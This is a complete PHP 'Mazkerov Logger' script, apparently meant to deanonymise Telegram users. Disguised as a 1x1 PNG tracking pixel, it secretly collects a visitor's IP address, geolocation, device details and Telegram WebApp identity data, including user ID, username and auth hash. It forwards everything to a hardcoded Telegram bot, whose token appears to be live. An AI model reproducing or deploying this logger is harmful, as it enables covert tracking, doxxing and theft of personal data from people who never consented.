<?php
$telegramToken = '7579566381:AAFdR-f-dGsrEUjYVIvf6XbMv-qbUptjAcE';
$chatId = '7098709482';

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Прямой заход';
$requestTime = date('Y-m-d H:i:s');
$requestMethod = $_SERVER['REQUEST_METHOD'];
$requestUri = $_SERVER['REQUEST_URI'];
$httpHost = $_SERVER['HTTP_HOST'];
$browserLanguage = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 15) : 'Не определен';
$isHTTPS = isset($_SERVER['HTTPS']) ? 'Да' : 'Нет';

$initData = $_GET['tgWebAppData'] ?? '';
$webAppData = [];
parse_str($initData, $webAppData);

$tgUser = isset($webAppData['user']) ? json_decode(urldecode($webAppData['user']), true) : [];
$tgUserId = $tgUser['id'] ?? 'Не доступно';
$tgFirstName = $tgUser['first_name'] ?? 'Не доступно';
$tgLastName = $tgUser['last_name'] ?? '';
$tgUsername = $tgUser['username'] ?? 'Не указан';
$tgLanguage = $tgUser['language_code'] ?? 'Не определен';
$tgIsPremium = isset($tgUser['is_premium']) ? ($tgUser['is_premium'] ? 'Да' : 'Нет') : 'Неизвестно';

$tgQueryId = $webAppData['query_id'] ?? 'Не доступно';
$tgHash = $webAppData['hash'] ?? 'Не доступно';
$tgAuthDate = isset($webAppData['auth_date']) ? date('Y-m-d H:i:s', $webAppData['auth_date']) : 'Не доступно';

$deviceIcons = [
    'Windows' => 'Windows💻',
    'Linux' => 'Linux🐧',
    'Mac' => 'Mac 🍎',
    'Android' => 'Android📱',
    'iOS' => 'IOS📱'
];

$isMobile = preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $userAgent) ? 'Да' : 'Нет';
$os = 'Неизвестно';
if (preg_match('/Windows/i', $userAgent)) $os = 'Windows';
elseif (preg_match('/Linux/i', $userAgent)) $os = 'Linux';
elseif (preg_match('/Macintosh|Mac OS X/i', $userAgent)) $os = 'Mac';
elseif (preg_match('/Android/i', $userAgent)) $os = 'Android';
elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = 'iOS';

$osIcon = $deviceIcons[$os] ?? '🖥️';

$ipInfo = getIpInfo($ip);

$htmlContent = '<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Информация о посетителе</title>
    <style>
        :root {
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --primary: #3b82f6;
            --text: #e2e8f0;
            --text-muted: #94a3b8;
            --warning: #ef4444;
            --success: #10b981;
        }
        body {
            font-family: "Segoe UI", system-ui, sans-serif;
            background-color: var(--bg-dark);
            color: var(--text);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
            border-bottom: 2px solid var(--primary);
            padding-bottom: 15px;
        }
        .header h1 {
            color: var(--primary);
            margin: 0;
            font-size: 28px;
        }
        .header .subtitle {
            color: var(--text-muted);
            font-size: 14px;
        }
        .card {
            background-color: var(--bg-card);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .card-title {
            color: var(--primary);
            margin-top: 0;
            margin-bottom: 15px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 160px 1fr;
            gap: 12px 8px;
        }
        .info-label {
            color: var(--text-muted);
            font-weight: 500;
        }
        .info-value {
            word-break: break-word;
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }
        .badge-warning {
            background-color: rgba(239, 68, 68, 0.2);
            color: var(--warning);
        }
        .badge-success {
            background-color: rgba(16, 185, 129, 0.2);
            color: var(--success);
        }
        .badge-info {
            background-color: rgba(59, 130, 246, 0.2);
            color: var(--primary);
        }
        .ip-block {
            font-family: "Courier New", monospace;
            background-color: rgba(59, 130, 246, 0.1);
            padding: 3px 6px;
            border-radius: 4px;
            font-size: 14px;
        }
        .footer {
            text-align: center;
            color: var(--text-muted);
            font-size: 12px;
            margin-top: 30px;
        }
        .tg-avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            vertical-align: middle;
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Информация о посетителе</h1>
            <div class="subtitle">Собранные данные о подключении</div>
        </div>
        
        '.(!empty($tgUser) ? '
        <div class="card">
            <h2 class="card-title">👤 Данные Telegram</h2>
            <div class="info-grid">
                <div class="info-label">ID пользователя:</div>
                <div class="info-value">'.$tgUserId.'</div>
                
                <div class="info-label">Имя:</div>
                <div class="info-value">'.$tgFirstName.' '.$tgLastName.'</div>
                
                <div class="info-label">Username:</div>
                <div class="info-value">@'.$tgUsername.'</div>
                
                <div class="info-label">Язык:</div>
                <div class="info-value">'.$tgLanguage.'</div>
                
                <div class="info-label">Telegram Premium:</div>
                <div class="info-value">
                    <span class="badge '.($tgIsPremium == 'Да' ? 'badge-success' : 'badge-info').'">
                        '.$tgIsPremium.'
                    </span>
                </div>
                
                <div class="info-label">Query ID:</div>
                <div class="info-value">'.$tgQueryId.'</div>
                
                <div class="info-label">Дата авторизации:</div>
                <div class="info-value">'.$tgAuthDate.'</div>
                
                <div class="info-label">WebApp Hash:</div>
                <div class="info-value"><span class="ip-block">'.substr($tgHash, 0, 10).'...</span></div>
            </div>
        </div>
        ' : '<div class="card"><h2 class="card-title">⚠️ Данные Telegram не получены</h2><p>Попробуйте обновить страницу или перезайти в WebApp.</p></div>').'
        
        <div class="card">
            <h2 class="card-title">📊 Основные данные</h2>
            <div class="info-grid">
                <div class="info-label">Дата и время:</div>
                <div class="info-value">'.$requestTime.'</div>
                
                <div class="info-label">IP адрес:</div>
                <div class="info-value"><span class="ip-block">'.$ip.'</span></div>
                
                <div class="info-label">Метод запроса:</div>
                <div class="info-value">'.$requestMethod.'</div>
                
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title">🌐 Геолокация</h2>
            <div class="info-grid">
                <div class="info-label">Страна:</div>
                <div class="info-value">'.($ipInfo['country'] ?? '<span class="text-muted">Неизвестно</span>').'</div>
                
                <div class="info-label">Город:</div>
                <div class="info-value">'.($ipInfo['city'] ?? '<span class="text-muted">Неизвестно</span>').'</div>
                
                <div class="info-label">Провайдер:</div>
                <div class="info-value">'.($ipInfo['provider'] ?? '<span class="text-muted">Неизвестно</span>').'</div>
                
                <div class="info-label">ASN:</div>
                <div class="info-value">'.($ipInfo['asn'] ?? '<span class="text-muted">Неизвестно</span>').'</div>
                
                <div class="info-label">IP Range:</div>
                <div class="info-value"><span class="ip-block">'.($ipInfo['range'] ?? 'Неизвестно').'</span></div>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title">🛡️ Безопасность</h2>
            <div class="info-grid">
                <div class="info-label">Прокси/VPN:</div>
                <div class="info-value">
                    <span class="badge '.($ipInfo['proxy'] == 'yes' ? 'badge-warning' : 'badge-success').'">
                        '.($ipInfo['proxy'] == 'yes' ? '⚠️ Обнаружен' : 'Не обнаружен').'
                    </span>
                </div>
                
                <div class="info-label">HTTPS:</div>
                <div class="info-value">
                    <span class="badge '.($isHTTPS == 'Да' ? 'badge-success' : 'badge-warning').'">
                        '.$isHTTPS.'
                    </span>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title">'.$osIcon.' Устройство</h2>
            <div class="info-grid">
                <div class="info-label">Операционная система:</div>
                <div class="info-value">'.$os.'</div>
                
                <div class="info-label">Мобильное устройство:</div>
                <div class="info-value">'.$isMobile.'</div>
                
                <div class="info-label">User Agent:</div>
                <div class="info-value">'.htmlspecialchars($userAgent).'</div>
                
                <div class="info-label">Язык браузера:</div>
                <div class="info-value">'.$browserLanguage.'</div>
            </div>
        </div>
        
        <div class="footer">
            Данные собраны в '.date('H:i:s').' | Mazkerov Logger
        </div>
    </div>
    
    <script>
    if (window.Telegram && Telegram.WebApp.initData && !window.location.search.includes("tgWebAppData")) {
        const url = new URL(window.location);
        url.searchParams.set("tgWebAppData", Telegram.WebApp.initData);
        window.location.href = url.toString();
    }
    </script>
</body>
</html>';

$tempFile = tempnam(sys_get_temp_dir(), 'Logs_') . '.html';
file_put_contents($tempFile, $htmlContent);

sendTelegramDocument($telegramToken, $chatId, $tempFile, '👤 New logs!');

unlink($tempFile);

header('Content-Type: image/png');
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');

function sendTelegramDocument($token, $chatId, $documentPath, $caption = '') {
    $url = "https://api.telegram.org/bot$token/sendDocument";
    
    $data = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];
    
    $document = new CURLFile(realpath($documentPath));
    $data['document'] = $document;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function getIpInfo($ip) {
    $url = "https://proxycheck.io/v2/$ip?vpn=1&asn=1";
    
    $options = [
        'http' => [
            'method' => 'GET',
            'timeout' => 3
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        return [];
    }
    
    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($data[$ip])) {
        return [];
    }
    
    return [
        'proxy' => $data[$ip]['proxy'] ?? 'no',
        'country' => $data[$ip]['country'] ?? null,
        'city' => $data[$ip]['city'] ?? null,
        'asn' => $data[$ip]['asn'] ?? null,
        'provider' => $data[$ip]['provider'] ?? null,
        'range' => $data[$ip]['range'] ?? null
    ];
}
?>